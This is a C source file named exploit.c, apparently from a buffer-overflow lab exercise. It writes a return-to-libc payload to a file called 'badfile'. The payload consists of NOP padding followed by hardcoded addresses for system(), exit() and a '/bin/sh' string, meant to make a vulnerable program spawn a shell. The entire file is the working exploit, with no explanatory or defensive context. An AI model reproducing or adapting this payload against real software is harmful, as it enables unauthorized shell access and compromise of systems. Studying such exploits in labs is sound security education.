/// \file exploit.c
/*
  ------------------------------------
    Create date: 2014-07-18 10:07
    Modified date: 2014-07-19 17:33
    Author: Sen1993
    Email: 1730806439@qq.com
  ------------------------------------
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv){
       char buf[40];
       FILE *badfile;
	   int i;

       badfile = fopen(".//badfile", "w");
		for(i = 0;i < 20; ++i){
		buf[i] = '\x90';
	   }
      
       *(long *) &buf[24] = 0x49d25970; // system()
       *(long *) &buf[28] = 0x49d19040 ; // exit()
       *(long *) &buf[32] = 0xbffffe3c; // "//bin//sh"
       fwrite(buf, sizeof(buf), 1, badfile);
       fclose(badfile);
}
